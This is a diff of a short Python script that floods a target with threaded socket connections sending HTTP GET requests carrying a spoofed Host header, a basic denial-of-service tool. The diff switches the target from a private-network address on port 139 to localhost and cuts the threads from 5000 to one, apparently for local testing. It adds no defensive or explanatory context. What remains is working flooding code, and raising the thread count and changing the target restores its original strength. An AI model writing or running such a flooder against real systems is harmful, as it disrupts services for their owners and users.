@@ -1,8 +1,8 @@
 import socket
 import threading
-target = '192.168.111.204'
+target = 'localhost'
 fake_ip = '182.21.20.32'
-port = 139
+port = 55555
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -11,7 +11,7 @@ def attack():
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
-for i in range(5000):
+for i in range(1):
     thread = threading.Thread(target=attack)
     thread.start()
 attack_num = 0
